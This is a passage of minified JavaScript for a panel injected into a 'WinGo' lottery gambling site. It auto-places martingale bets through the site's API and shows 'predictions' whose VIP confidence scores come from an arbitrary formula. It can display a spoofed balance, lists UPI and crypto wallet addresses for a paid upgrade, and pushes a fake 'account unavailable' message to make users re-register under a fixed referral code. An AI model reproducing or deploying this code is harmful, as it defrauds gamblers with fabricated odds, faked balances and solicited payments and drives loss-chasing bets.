    } else f = JSON.stringify(e);
    return rt(n, i, f, l);
}
async function Ce(n, t, e, o) {
    var i = vt({
        gameCode: n,
        issueNumber: t,
        amount: e,
        betMultiple: 1,
        betContent: o,
        language: "en",
    });
    return wt("POST", "/api/Lottery/WinGoBet", i);
}
async function St() {
    var n = vt({
        language: "en",
    });
    return wt("GET", "/api/Lottery/GetBalance", n);
}
async function qt(n) {
    var t = vt({
        issueNumber: n,
        language: "en",
    });
    return wt("GET", "/api/Lottery/GetWinLossResult", t);
}
async function We(n) {
    return rt("GET", "/WinGo/" + n + ".json?ts=" + Date.now());
}
async function Ue(n) {
    return rt(
        "GET",
        "/WinGo/" + n + "/GetHistoryIssuePage.json?ts=" + Date.now(),
    );
}
var Wn = "WinGo_30S",
    Pe = "wg_mining_session",
    mt = "wg_mining_history",
    ze = [1, 2, 4, 8, 16, 32, 64, 128, 256, 512],
    Un = 5,
    Oe = 100;
function I(n) {
    return Math.round(n * 100) / 100;
}
var gt = [],
    Et = [];
function Je(n) {
    gt.push(n);
}
function He(n) {
    Et.push(n);
}
function Ge() {
    ((gt = []), (Et = []));
}
function H(n, t) {
    (console.log("[MINING]", n), gt.forEach((e) => e(n, t)));
}
function Ie() {
    Et.forEach((n) => n(N()));
}
function N() {
    try {
        return JSON.parse(localStorage.getItem(Pe)) || null;
    } catch (n) {
        return null;
    }
}
function pn(n) {
    (localStorage.setItem(Pe, JSON.stringify(n)), Ie());
}
function No(n, t, e) {
    return {
        active: !0,
        gameCode: Wn,
        startedAt: Date.now(),
        startBalance: n,
        targetBalance: t,
        stopLoss: e,
        baseUnit: Math.max(1, Math.floor(n * 0.01)),
        martingaleStep: 0,
        lastBetPeriod: "",
        lastBetAmount: 0,
        lastBetSide: "",
        pendingResult: !1,
        stats: {
            rounds: 0,
            wins: 0,
            losses: 0,
            netPL: 0,
        },
    };
}
function Xo(n) {
    try {
        var t = Lt();
        if ((t.unshift(n), t.length > Oe)) t.length = Oe;
        localStorage.setItem(mt, JSON.stringify(t));
    } catch (e) { }
}
function Lt() {
    try {
        return JSON.parse(localStorage.getItem(mt)) || [];
    } catch (n) {
        return [];
    }
}
function Qe() {
    localStorage.removeItem(mt);
}
var Y = null,
    T = !1,
    x = !1,
    on = 0;
function Ne() {
    var n = N();
    return n && n.active;
}
function Xe() {
    return N();
}
async function Ze(n, t, e) {
    if (x) return !1;
    var o = N();
    if (o && o.pendingResult) {
        if (
            (H("Previous bet still unverified. Checking result first...", "wait"),
                (x = !0),
                on++,
                await Ve(o, on),
                !x)
        )
            return !1;
    }
    var i = Math.max(1, Math.floor(n * 0.01));
    if (n < i * 7)
        return (
            H("Balance too low. Need at least ₹" + i * 7 + " to start.", "loss"),
            !1
        );
    if (t <= n)
        return (H("Target must be higher than current balance.", "loss"), !1);
    return (
        pn(No(n, t, e)),
        (T = !1),
        (x = !0),
        on++,
        H(
            "Started mining — ₹" +
            I(n) +
            " → ₹" +
            I(t) +
            (e ? " | Stop below ₹" + I(e) : ""),
            "active",
        ),
        cn(on),
        !0
    );
}
function Fe() {
    var n = N();
    if (n && n.pendingResult) {
        ((T = !0), H("Stopping after current round finishes...", "wait"));
        return;
    }
    V("Stopped.");
}
function V(n) {
    if (((x = !1), (T = !1), Y)) (clearTimeout(Y), (Y = null));
    var t = N();
    if (t)
        ((t.active = !1),
            pn(t),
            H(
                n +
                " — " +
                t.stats.rounds +
                " rounds, " +
                t.stats.wins +
                "W/" +
                t.stats.losses +
                "L, P&L ₹" +
                I(t.stats.netPL),
                "active",
            ));
    else H(n, "active");
}
function X(n) {
    return n !== on;
}
async function Ye() {
    var n = N();
    if (!n || !n.active) return !1;
    ((x = !0), (T = !1), on++);
    var t = on;
    if (
        (H("Picking up where we left off...", "wait"),
            n.pendingResult && n.lastBetPeriod)
    )
        (H("Checking last bet result...", "wait"), await Ve(n, t));
    if (X(t)) return !1;
    if (T) return (V("Stopped."), !1);
    if (((n = N()), n && n.active && x)) return (cn(t), !0);
    return !1;
}
async function Ve(n, t) {
    for (var e = 1; e <= Un; e++) {
        if (X(t)) return;
        try {
            var o = await qt(n.lastBetPeriod);
            if (X(t)) return;
            if (o && o.data && o.data.status !== void 0) {
                Ke(n, o.data.status === !0, o.data.winAmount || 0);
                return;
            }
        } catch (i) { }
        if (
            (H("Checking result... attempt " + e + "/" + Un, "wait"),
                await new Promise(function (i) {
                    setTimeout(i, e * 3000);
                }),
                X(t))
        )
            return;
        if (((n = N()), !n || !n.active)) return;
    }
    V(
        "⚠️ Couldn't verify last bet after " +
        Un +
        " tries. Please check your balance.",
    );
}
function Ke(n, t, e) {
    ((n.pendingResult = !1), n.stats.rounds++);
    var o;
    if (t)
        ((o = I(e - n.lastBetAmount)),
            n.stats.wins++,
            (n.stats.netPL = I(n.stats.netPL + o)),
            (n.martingaleStep = 0));
    else
        ((o = -I(n.lastBetAmount)),
            n.stats.losses++,
            (n.stats.netPL = I(n.stats.netPL + o)),
            (n.martingaleStep =
                n.martingaleStep >= ze.length - 1 ? 0 : n.martingaleStep + 1));
    return (
        pn(n),
        Xo({
            sessionId: n.startedAt,
            period: n.lastBetPeriod,
            amount: n.lastBetAmount,
            side: n.lastBetSide,
            result: t ? "win" : "loss",
            net: o,
            time: Date.now(),
        }),
        {
            won: t,
            net: o,
        }
    );
}
async function cn(n) {
    if (X(n)) return;
    var t = N();
    if (!t || !t.active) {
        x = !1;
        return;
    }
    try {
        var e = await We(Wn);
        if (X(n)) return;
        var o = Date.now(),
            i = e.current.endTime,
            l = i - o,
            f = e.current.issueNumber;
        if (l < 8000) {
            (H("Round ending soon, waiting for the next one...", "wait"),
                (Y = setTimeout(function () {
                    cn(n);
                }, l + 2000)));
            return;
        }
        var c = l - 8000;
        (H("Next round in " + Math.ceil(c / 1000) + "s...", "wait"),
            (Y = setTimeout(function () {
                Zo(f, i, n);
            }, c)));
    } catch (p) {
        (H("Connection issue, retrying in 5s...", "loss"),
            (Y = setTimeout(function () {
                cn(n);
            }, 5000)));
    }
}
async function Zo(n, t, e) {
    if (X(e)) return;
    var o = N();
    if (!o || !o.active) return;
    var i;
    try {
        i = await St();
    } catch (v) {
        if ((H("Couldn't check balance, skipping this round.", "loss"), !X(e)))
            Y = setTimeout(function () {
                cn(e);
            }, 5000);
        return;
    }
    if (X(e)) return;
    if (((o = N()), !o || !o.active)) return;
    var l = I(i.data.balance);
    if (
        ((window.__wg_balance = l),
            window.dispatchEvent(
                new CustomEvent("wg-balance", {
                    detail: {
                        balance: l,
                    },
                }),
            ),
            l >= I(o.targetBalance))
    ) {
        V("\uD83C\uDFAF Target reached! ₹" + l);
        return;
    }
    if (o.stopLoss && l <= I(o.stopLoss)) {
        V("\uD83D\uDED1 Balance dropped to ₹" + l + ", stopping.");
        return;
    }
    var f = ze[o.martingaleStep] || 1,
        c = o.baseUnit * f;
    if (l < c) {
        if (o.martingaleStep > 0) {
            var p = o.martingaleStep;
            ((o.martingaleStep = 0),
                (c = o.baseUnit),
                pn(o),
                H("Can't afford recovery bet, going back to ₹" + c + ".", "wait"));
        }
        if (l < c) {
            V("Not enough balance for the minimum bet (₹" + c + ").");
            return;
        }
    }
    if (o.martingaleStep === 0) {
        var w = I(o.targetBalance - l);
        if (c > w && w >= 1)
            ((c = Math.max(1, Math.ceil(w / 0.96))),
                H("Almost there — betting ₹" + c + " to finish.", "wait"));
    }
    if (o.stopLoss && I(l - c) < I(o.stopLoss)) {
        V(
            "\uD83D\uDED1 This bet would drop balance below ₹" +
            I(o.stopLoss) +
            ", stopping.",
        );
        return;
    }
    var S = "BigSmall_Big",
        M = "Big",
        q = 50,
        h = window.__wgSpoofer && window.__wgSpoofer.isVip();
    if (h) {
        var $ = window.__wgSpoofer.predictNum(Wn, n);
        ((M = $ >= 5 ? "Big" : "Small"),
            (S = $ >= 5 ? "BigSmall_Big" : "BigSmall_Small"));
        var L = window.__wgSpoofer.getSettings();
        q = L ? L.accuracy : 70;
    } else
        try {
            var m = await Ue(Wn);
            if (X(e)) return;
            if (m && m.data && m.data.list) {
                var y = Ln(m.data.list);
                ((M = y.prediction),
                    (q = y.confidence),
                    (S = M === "Big" ? "BigSmall_Big" : "BigSmall_Small"));
            }
        } catch (v) {
            H("Couldn't load history, going with Big.", "wait");
        }
    if (X(e)) return;
    if (((o = N()), !o || !o.active)) return;
    if (T) {
        V("Stopped.");
        return;
    }
    var a =
        o.martingaleStep > 0 ? " (recovery " + (o.martingaleStep + 1) + "/" + ze.length + ")" : "";
    (H("⚡ Placing ₹" + c + " on " + M + a + " — " + q + "% confident", "active"),
        (o.lastBetPeriod = n),
        (o.lastBetAmount = c),
        (o.lastBetSide = S),
        (o.pendingResult = !0),
        pn(o));
    try {
        var u = await Ce(Wn, n, c, S);
        if (X(e)) return;
        if (u.code !== 0) {
            if (((o = N()), o)) ((o.pendingResult = !1), pn(o));
            if (
                (H("Bet was rejected" + (u.msg ? ": " + u.msg : "") + ".", "loss"), T)
            ) {
                V("Stopped.");
                return;
            }
            Y = setTimeout(function () {
                cn(e);
            }, 3000);
            return;
        }
    } catch (v) {
        if (
            (H(
                "Network issue while betting. Will check the result when the round ends.",
                "loss",
            ),
                X(e))
        )
            return;
        if (T) {
            if (
                (H(
                    "Stop requested, but last bet is unverified. It will be checked on next start.",
                    "wait",
                ),
                    (x = !1),
                    (T = !1),
                    Y)
            )
                (clearTimeout(Y), (Y = null));
            Ie();
            return;
        }
        Y = setTimeout(
            function () {
                Fn(n, 0, e);
            },
            Math.max(t - Date.now() + 3000, 2000),
        );
        return;
    }
    (H("Bet placed ✓ — waiting for result...", "wait"),
        (Y = setTimeout(
            function () {
                Fn(n, 0, e);
            },
            Math.max(t - Date.now() + 3000, 2000),
        )));
}
async function Fn(n, t, e) {
    if (X(e)) return;
    var o = N();
    if (!o || !o.pendingResult || o.lastBetPeriod !== n) return;
    var i = !1,
        l = 0;
    try {
        var f = await qt(n);
        if (X(e)) return;
        if (f && f.data && f.data.status !== void 0)
            ((i = f.data.status === !0), (l = f.data.winAmount || 0));
        else {
            if (t < Un) {
                var c = Math.min(3000 * (t + 1), 15000);
                (H("Result not in yet, checking again...", "wait"),
                    (Y = setTimeout(function () {
                        Fn(n, t + 1, e);
                    }, c)));
                return;
            }
            V("⚠️ Couldn't get the result. Please check your balance.");
            return;
        }
    } catch (M) {
        if (X(e)) return;
        if (t < Un) {
            var c = Math.min(5000 * (t + 1), 15000);
            (H("Error checking result, trying again...", "loss"),
                (Y = setTimeout(function () {
                    Fn(n, t + 1, e);
                }, c)));
            return;
        }
        V(
            "⚠️ Couldn't get the result after multiple tries. Please check your balance.",
        );
        return;
    }
    if (((o = N()), !o || !o.pendingResult || o.lastBetPeriod !== n)) return;
    var p = Ke(o, i, l);
    if (p.won) H("✅ WON +₹" + p.net + " (payout ₹" + I(l) + ")", "win");
    else if (((o = N()), o.martingaleStep === 0))
        H("❌ Lost ₹" + I(-p.net) + " — resetting to base bet.", "loss");
    else
        H(
            "❌ Lost ₹" +
            I(-p.net) +
            " — doubling next bet (step " +
            (o.martingaleStep + 1) +
            "/" +
            ze.length +
            ")",
            "loss",
        );
    try {
        var w = await St();
        if (X(e)) return;
        var S = I(w.data.balance);
        ((window.__wg_balance = S),
            window.dispatchEvent(
                new CustomEvent("wg-balance", {
                    detail: {
                        balance: S,
                    },
                }),
            ),
            (o = N()),
            H(
                "\uD83D\uDCB0 Balance: ₹" +
                S +
                " | Profit: ₹" +
                I(o.stats.netPL) +
                " | " +
                o.stats.wins +
                "W/" +
                o.stats.losses +
                "L",
                "active",
            ));
    } catch (M) { }
    if (T) {
        V("Stopped.");
        return;
    }
    cn(e);
}
function yn(n) {
    let t = n.querySelector("#btn-mining-back"),
        e = n.querySelector("#btn-mining-start"),
        o = n.querySelector("#mine-target-goal"),
        i = n.querySelector("#mine-stop-loss"),
        l = n.querySelector("#mine-current-bal"),
        f = n.querySelector("#mine-energy-count"),
        c = n.querySelector("#mine-console"),
        p = n.querySelector("#mining-energy-modal"),
        w = n.querySelector("#btn-energy-topup"),
        S = n.querySelector("#btn-energy-boost"),
        M = n.querySelector("#btn-energy-close"),
        q = n.querySelector("#btn-mining-history"),
        h = n.querySelector("#mining-history-modal"),
        $ = n.querySelector("#btn-history-close"),
        L = n.querySelector("#btn-history-clear"),
        m = n.querySelector("#mining-history-list"),
        y = 0;
    if (f) f.textContent = y;
    let a = () => {
        let W = window.__wg_balance || 0;
        if (window.__wgSpoofer && window.__wgSpoofer.isVip())
            try {
                let U = JSON.parse(localStorage.getItem("wg_spoof_state"));
                if (U && U.balance !== null) W = U.balance;
            } catch (U) { }
        if (l) l.textContent = "₹" + Number(W).toFixed(2);
    };
    a();
    let u = (W, U) => {
        if (!c) return;
        let z = document.createElement("div");
        ((z.className = "console-line" + (U ? " " + U : "")),
            (z.textContent = "[" + new Date().toLocaleTimeString() + "] " + W),
            c.appendChild(z),
            (c.scrollTop = c.scrollHeight));
    },
        v = (W) => {
            if (!e) return;
            if (W) ((e.textContent = "Stop Mining"), e.classList.add("active"));
            else
                ((e.textContent = "Start Mining · 1 Energy"),
                    e.classList.remove("active"));
        };
    if (
        (Ge(),
            Je((W, U) => {
                u(W, U);
            }),
            He((W) => {
                if ((a(), W && !W.active)) {
                    if ((v(!1), o)) o.disabled = !1;
                    if (i) i.disabled = !1;
                }
            }),
            yn._onBalance)
    )
        window.removeEventListener("wg-balance", yn._onBalance);
    if (
        ((yn._onBalance = () => a()),
            window.addEventListener("wg-balance", yn._onBalance),
            t)
    )
        t.addEventListener("click", () => {
            let W = n.host;
            if (W && typeof W._setView === "function") W._setView("menu");
        });
    if (S)
        S.addEventListener("click", () => {
            if (((y = 1), f)) f.textContent = y;
            if (p) p.style.display = "none";
            u("Energy recharged — you're good to go.", "win");
        });
    if (w)
        w.addEventListener("click", () => {
            u("Paid energy is coming soon. Use the free option for now.", "wait");
        });
    if (M)
        M.addEventListener("click", () => {
            if (p) p.style.display = "none";
        });
    function r() {
        if (!m) return;
        m.innerHTML = "";
        var W = Lt();
        W.forEach(function (U) {
            var z = document.createElement("div");
            z.className = "hist-entry";
            var J = U.side === "BigSmall_Big" ? "BIG" : "SML";
            ((z.innerHTML =
                '<span class="hist-side ' +
                U.side +
                '">' +
                J +
                "</span>" +
                '<span class="hist-amt">₹' +
                U.amount +
                '</span><span class="hist-net ' +
                U.result +
                '">' +
                (U.net >= 0 ? "+" : "") +
                "₹" +
                Math.abs(U.net).toFixed(2) +
                '</span><span class="hist-time">' +
                new Date(U.time).toLocaleTimeString() +
                "</span>"),
                m.appendChild(z));
        });
    }
    if (q)
        q.addEventListener("click", () => {
            if ((r(), h)) h.style.display = "flex";
        });
    if ($)
        $.addEventListener("click", () => {
            if (h) h.style.display = "none";
        });
    if (L)
        L.addEventListener("click", () => {
            (Qe(), r());
        });
    if (e)
        e.addEventListener("click", async () => {
            if (Ne()) {
                Fe();
                return;
            }
            var W = window.__wg_balance || 0,
                U = parseFloat(o ? o.value : "0") || 0,
                z = parseFloat(i ? i.value : "0") || 0;
            if (U <= W) {
                u("Set a target higher than your current balance.", "loss");
                return;
            }
            if (z && z >= W) {
                u("Stop-loss must be lower than your current balance.", "loss");
                return;
            }
            if (c) c.innerHTML = "";
            if ((v(!0), o)) o.disabled = !0;
            if (i) i.disabled = !0;
            var J = await Ze(W, U, z);
            if (!J) {
                if ((v(!1), o)) o.disabled = !1;
                if (i) i.disabled = !1;
            }
        });
    (async () => {
        var W = await Ye();
        if (W) {
            if ((v(!0), o)) o.disabled = !0;
            if (i) i.disabled = !0;
            var U = Xe();
            if (U) {
                if (o) o.value = U.targetBalance;
                if (i && U.stopLoss) i.value = U.stopLoss;
            }
        }
    })();
}
var D = {
    upi: ["adrenox1@ybl", "anthropic1@upi"],
    crypto: {
        trc20: "TEQzuoAUiBEP8i5H1QhUBvKgGkJmFV3hVN",
        bep20: "0x30c139ADe43773B96B2Fb344A2c317de6C564058",
    },
    amount: 2399,
    cryptoAmountUsd: 24,
};
var vn,
    Yn = 0;
sessionStorage.setItem("invitecode", "116261778244");
var Yo = "https://imgametransit.com",
    Vo = "Account unavailable. Please create a new account.",
    Ko = "/#/register?invitationCode=116261778244",
    Do = "/#/wallet/Recharge",
    Bo = "www.8okwin4.com".includes("okwin") ? "light" : "dark",
    Ao = "www.8okwin4.com".includes("okwin") ? "OKWIN" : "JAIWIN",
    so = "www.8okwin4.com".includes("okwin") ? "test.wakeuptorealityok.workers.dev" : "jaiclub.win",
    De = "";
function _(n) {
    let t = String(n == null ? "" : n).trim();
    return /^\d{8,22}$/.test(t) ? t : "";
}
function Be(n) {
    if (((n = _(n)), !n)) return "";
    try {
        return (BigInt(n) + 1n).toString();
    } catch (t) {
        return "";
    }
}
function To(n, t) {
    if (((n = _(n)), (t = _(t)), !n || !t)) return 0;
    try {
        let e = BigInt(n),
            o = BigInt(t);
        return e > o ? 1 : e < o ? -1 : 0;
    } catch (e) {
        return n > t ? 1 : n < t ? -1 : 0;
    }
}
function Ro(n, t, e) {
    let o = n.querySelector("#pred-history");
    if (!o) return;
    let i = (e || []).slice(0, 8),
        l = _(i[0]?.issueNumber ?? i[0]?.issue),
        f = t + ":" + l + ":" + i.map((w) => w.number || w.num || w).join(",");
    if (f === De) return;
    De = f;
    let c = document.createDocumentFragment(),
        p = document.createElement("span");
    if (
        ((p.className = "hist-label"),
            (p.textContent = "Recent"),
            c.appendChild(p),
            i.length < 2)
    ) {
        (o.replaceChildren(c), (o.style.display = "none"));
        return;
    }
    (i.forEach((w) => {
        let S = parseInt(w.number || w.num || w),
            M = document.createElement("span");
        ((M.className = "hist-dot " + (S >= 5 ? "big" : "small")),
            (M.title = (S >= 5 ? "Big" : "Small") + ": " + S),
            c.appendChild(M));
    }),
        o.replaceChildren(c),
        (o.style.display = "flex"));
}
function bo(n, t) {
    let e = n.querySelector("#streak-badge"),
        o = n.querySelector("#streak-text");
    if (!e || !o) return;
    if (t.streak && t.streak.len >= 3)
        ((o.textContent = t.streak.len + "× " + t.streak.side),
            (e.style.display = "flex"));
    else e.style.display = "none";
}
var Ae = "";
function se() {
    let n = document.querySelector("prediction-panel")?.shadowRoot;
    if (!n) return;
    let t = it(),
        e = Nn(),
        o = ee(),
        i = window.__wgSpoofer,
        l = i && i.isVip();
    if (!t.length && !(l && e && _(o))) {
        (tn("loading"), en(), ue());
        return;
    }
    let f = _(t[0]?.issueNumber ?? t[0]?.issue),
        c = _(o);
    if (f && (!c || To(c, f) <= 0)) c = Be(f);
    let p = _(oe());
    if (p && c && Be(p) !== c) {
        tn("loading");
        return;
    }
    let w = [
        e,
        f,
        c,
        t
            .slice(0, 8)
            .map((y) => y.number || y.num || y)
            .join(","),
    ].join("|");
    if (w === Ae) {
        tn("result");
        return;
    }
    Ae = w;
    let S;
    if (l && e && c) {
        let y = i.predictNum(e, c),
            a = y === 0 || y === 5 ? "violet" : y % 2 === 0 ? "red" : "green";
        S = {
            prediction: y >= 5 ? "Big" : "Small",
            confidence: 73 + ((y * 7 + 3) % 22),
            color: a,
            topNumber: y,
            signals: [],
            heatmap: {
                hot: [],
                cold: [],
            },
            streak: null,
        };
    }
    if (!S) S = Ln(t);
    let M = S.prediction === "Big",
        q = n.querySelector("#pred-pill");
    ((q.textContent = S.prediction),
        (q.className = "pred-size " + (M ? "big" : "small")));
    let h = n.querySelector("#pred-color");
    ((h.textContent = S.color.charAt(0).toUpperCase() + S.color.slice(1)),
        (h.className = "pred-color " + S.color));
    let $ = S.topNumber ?? S.heatmap?.hot?.[0] ?? 0;
    ((n.querySelector("#hero-ball").style.backgroundImage =
        "url('" + _t($) + "')"),
        (n.querySelector("#pred-glow").className =
            "pred-glow " + (M ? "big" : "small")),
        (n.querySelector("#pro-card").className =
            "pro-card c-" + (M ? "big" : "small")));
    let L = n.querySelector("#conf-fill");
    ((L.style.width = S.confidence + "%"),
        (L.className = "conf-fill" + (M ? "" : " small")),
        (n.querySelector("#conf-pct").textContent = S.confidence + "%"),
        Ro(n, e, t));
    let m = n.querySelector("#pro-period");
    if (m && c) m.textContent = "#" + c.slice(-6);
    (bo(n, S),
        n.querySelector("#pro-prediction").classList.toggle("vip-mode", !!l),
        tn("result"));
}
Wt({
    apiBase: Yo,
    spoofDomain: "www.8okwin4.com",
    minBalance: 500,
    nukeUrl: Ko,
    authErrMsg: Vo,
    onBalance: (n) => {
        window.__wg_balance = n;
    },
    onWingo: (n, t) => fe(n, t),
});
Bt();
ae({
    onPred: se,
});
if (!customElements.get("prediction-panel"))
    customElements.define(
        "prediction-panel",
        class extends HTMLElement {
            connectedCallback() {
                if (!document.querySelector("link[data-wg-font]")) {
                    let q = document.createElement("link");
                    ((q.rel = "stylesheet"),
                        (q.href =
                            "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"),
                        (q.dataset.wgFont = "1"),
                        document.head.appendChild(q));
                }
                ((this._mode = "logo"), this.classList.add(Bo));
                let n = this.attachShadow({
                    mode: "open",
                });
                ((n.innerHTML =
                    '<style>:host { position: fixed; z-index: 2147483647; touch-action: none; user-select: none; --f: \'Inter\', -apple-system, BlinkMacSystemFont, \'Segoe UI\', sans-serif; --ease: cubic-bezier(.4,0,.2,1); --panel-bg: linear-gradient(155deg, rgba(11,9,30,.98) 0%, rgba(20,16,50,.97) 100%); --panel-border: rgba(139,92,246,.22); --panel-shadow: 0 24px 64px rgba(0,0,0,.75), 0 0 0 1px rgba(255,255,255,.06), 0 0 100px rgba(99,60,220,.08); --hdr-bg: rgba(255,255,255,.03); --hdr-border: rgba(255,255,255,.07); --t-title: #f1f0ff; --t-name: #f1f0ff; --t-body: rgba(255,255,255,.52); --t-dim: rgba(255,255,255,.25); --x-bg: rgba(255,255,255,.07); --x-col: rgba(255,255,255,.32); --x-bg-h: rgba(255,255,255,.14); --x-col-h: rgba(255,255,255,.8); --card-bg: rgba(255,255,255,.035); --card-bdr: rgba(255,255,255,.07); --back-bg: rgba(255,255,255,.06); --back-bdr: rgba(255,255,255,.09); --back-col: rgba(255,255,255,.5); --back-col-h: rgba(255,255,255,.9); --back-bdr-h: rgba(139,92,246,.5); --pro: #8b5cf6; --pro-lt: rgba(139,92,246,.14); --pro-glow: rgba(139,92,246,.2); --pro-txt: #c4b5fd; --pro-bdr-h: rgba(139,92,246,.45); --vip: #f59e0b; --vip-lt: rgba(245,158,11,.13); --vip-glow: rgba(245,158,11,.2); --vip-txt: #fde68a; --vip-bdr-h: rgba(245,158,11,.45); --mine: #10b981; --mine-lt: rgba(16, 185, 129, .14); --mine-glow: rgba(16, 185, 129, .2); --mine-txt: #a7f3d0; --mine-bdr-h: rgba(16, 185, 129, .45); --upi: #06b6d4; --upi-lt: rgba(6, 182, 212, .14); --upi-glow: rgba(6, 182, 212, .2); --upi-txt: #a5f3fc; --upi-bdr-h: rgba(6, 182, 212, .45); --crypto: #eab308; --crypto-lt: rgba(234, 179, 8, .13); --crypto-glow: rgba(234, 179, 8, .2); --crypto-txt: #fef08a; --crypto-bdr-h: rgba(234, 179, 8, .45); --pc-bg: linear-gradient(150deg, rgba(20,16,52,.94) 0%, rgba(12,10,34,.97) 100%); --pc-bdr: rgba(139,92,246,.16); --pc-shad: 0 10px 36px rgba(0,0,0,.45), 0 0 0 1px rgba(139,92,246,.1); --tw-bg: rgba(255,255,255,.04); --tw-bdr: rgba(255,255,255,.07); --big: #FEAA57; --small: #6EA8F4; --strip: rgba(255,255,255,.07); --live: #34d399; --gate-title: #f1f0ff; --gate-bal-bg: rgba(139,92,246,.12); --gate-bal-col: #c4b5fd; --gate-bal-bdr: rgba(139,92,246,.22); --stat-bg: rgba(255,255,255,.03); --stat-bdr: rgba(255,255,255,.07); --chev: rgba(255,255,255,.15); --chip-bg: rgba(255,255,255,.07); --chip-bdr: rgba(255,255,255,.1); --chip-col: rgba(255,255,255,.7); --chip-hash: rgba(255,255,255,.42);}:host(.light) { --panel-bg: linear-gradient(155deg, #ffffff 0%, #fff8f8 100%); --panel-border: rgba(249,89,89,.18); --panel-shadow: 0 16px 52px rgba(180,30,30,.14), 0 0 0 1px rgba(249,89,89,.12), 0 4px 16px rgba(0,0,0,.06); --hdr-bg: linear-gradient(100deg, #f95959 0%, #ff8080 100%); --hdr-border: transparent; --t-title: #1f1f2e; --t-name: #1f1f2e; --t-body: #6b7280; --t-dim: rgba(0,0,0,.3); --x-bg: rgba(255,255,255,.22); --x-col: rgba(255,255,255,.85); --x-bg-h: rgba(255,255,255,.36); --x-col-h: #fff; --card-bg: rgba(0,0,0,.022); --card-bdr: rgba(0,0,0,.08); --back-bg: rgba(0,0,0,.04); --back-bdr: rgba(0,0,0,.1); --back-col: #6b7280; --back-col-h: #1f1f2e; --back-bdr-h: rgba(224,60,60,.4); --pro: #e03c3c; --pro-lt: rgba(224,60,60,.08); --pro-glow: rgba(224,60,60,.14); --pro-txt: #c0392b; --pro-bdr-h: rgba(224,60,60,.4); --vip: #d97706; --vip-lt: rgba(217,119,6,.08); --vip-glow: rgba(217,119,6,.13); --vip-txt: #b45309; --vip-bdr-h: rgba(217,119,6,.4); --mine: #059669; --mine-lt: rgba(5, 150, 105, .08); --mine-glow: rgba(5, 150, 105, .13); --mine-txt: #047857; --mine-bdr-h: rgba(5, 150, 105, .4); --upi: #0891b2; --upi-lt: rgba(8, 145, 178, .08); --upi-glow: rgba(8, 145, 178, .13); --upi-txt: #0e7490; --upi-bdr-h: rgba(8, 145, 178, .4); --crypto: #ca8a04; --crypto-lt: rgba(202, 138, 4, .08); --crypto-glow: rgba(202, 138, 4, .13); --crypto-txt: #854d0e; --crypto-bdr-h: rgba(202, 138, 4, .4); --pc-bg: linear-gradient(150deg, #ffffff 0%, #f9f0ff 100%); --pc-bdr: rgba(224,60,60,.14); --pc-shad: 0 6px 24px rgba(0,0,0,.08), 0 0 0 1px rgba(224,60,60,.08); --tw-bg: rgba(0,0,0,.025); --tw-bdr: rgba(0,0,0,.08); --strip: rgba(0,0,0,.07); --gate-title: #111827; --gate-bal-bg: rgba(220,38,38,.07); --gate-bal-col: #dc2626; --gate-bal-bdr: rgba(220,38,38,.14); --stat-bg: rgba(0,0,0,.025); --stat-bdr: rgba(0,0,0,.07); --chev: rgba(0,0,0,.14); --chip-bg: rgba(249,89,89,.08); --chip-bdr: rgba(249,89,89,.16); --chip-col: #374151; --chip-hash: #9ca3af;}.logo { width: 50px; height: 50px; border-radius: 50%; overflow: hidden; cursor: grab; display: block; transition: box-shadow .22s, transform .22s; box-shadow: 0 4px 20px rgba(0,0,0,.45), 0 0 0 2.5px rgba(255,255,255,.15), 0 0 0 5px rgba(139,92,246,.08);}.logo:hover { box-shadow: 0 6px 26px rgba(0,0,0,.55), 0 0 0 2.5px rgba(255,255,255,.25), 0 0 0 6px rgba(139,92,246,.14); transform: scale(1.06) }.logo.dragging { cursor: grabbing; transform: scale(.93); box-shadow: 0 8px 30px rgba(0,0,0,.6) }.logo img { width: 100%; height: 100%; object-fit: cover; display: block; pointer-events: none }:host(.light) .logo { box-shadow: 0 4px 18px rgba(200,50,50,.3), 0 0 0 2.5px rgba(249,89,89,.28), 0 0 0 5px rgba(249,89,89,.1) }:host(.light) .logo:hover { box-shadow: 0 6px 24px rgba(200,50,50,.4), 0 0 0 2.5px rgba(249,89,89,.4), 0 0 0 6px rgba(249,89,89,.14) }:host([data-route="other"]) .logo, :host([data-route="other"]) .panel { display: none !important }.panel { display: none; width: min(86vw, 288px); border-radius: 20px; overflow: hidden; background: var(--panel-bg); border: 1px solid var(--panel-border); box-shadow: var(--panel-shadow); backdrop-filter: blur(36px); -webkit-backdrop-filter: blur(36px); font-family: var(--f);}.panel.active { display: block; animation: panelIn .22s var(--ease) }@keyframes panelIn { from { opacity:0; transform:scale(.91) translateY(8px) } to { opacity:1; transform:scale(1) translateY(0) } }.panel-header { display: flex; align-items: center; justify-content: space-between; padding: 11px 13px; cursor: grab; background: var(--hdr-bg); border-bottom: 1px solid var(--hdr-border);}.panel-header.dragging { cursor: grabbing }.panel-title { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; color: var(--t-title); letter-spacing: -.1px }:host(.light) .panel-title { color: #fff }.panel-title img { width: 20px; height: 20px; border-radius: 50%; box-shadow: 0 1px 6px rgba(0,0,0,.25); cursor: pointer; touch-action: manipulation; position: relative; z-index: 1 }.brand-name { font-size: 13.5px; font-weight: 800; letter-spacing: .3px }.ai-badge { padding: 1px 5px; border-radius: 4px; font-size: 8.5px; font-weight: 700; letter-spacing: .8px; background: transparent; border: 1px solid rgba(255,255,255,.35); color: rgba(255,255,255,.8); line-height: 1.5 }:host(.light) .ai-badge { border-color: rgba(255,255,255,.5); color: rgba(255,255,255,.9) }.brand-domain { font-size: 10px; font-weight: 500; color: #5a5d72; letter-spacing: .1px }.brand-domain::before { content: \'·\'; margin-right: 4px; opacity: .5 }:host(.light) .brand-domain { color: rgba(255,255,255,.6) }.close-btn { width: 24px; height: 24px; border-radius: 7px; border: none; background: var(--x-bg); color: var(--x-col); font-size: 11px; cursor: pointer; line-height: 1; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .15s;}.close-btn:hover { background: var(--x-bg-h); color: var(--x-col-h) }.panel-body { padding: 14px 12px 13px; color: var(--t-body); font-size: 12px; line-height: 1.5; animation: fadeUp .24s var(--ease) .04s both }@keyframes fadeUp { from { opacity:0; transform:translateY(8px) } to { opacity:1; transform:translateY(0) } }.view { display: none }.view.active { display: block; animation: viewIn .2s var(--ease) }@keyframes viewIn { from { opacity:0; transform:translateX(8px) } to { opacity:1; transform:translateX(0) } }.view.active { display: block; animation: viewIn .2s var(--ease) }.view-menu.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 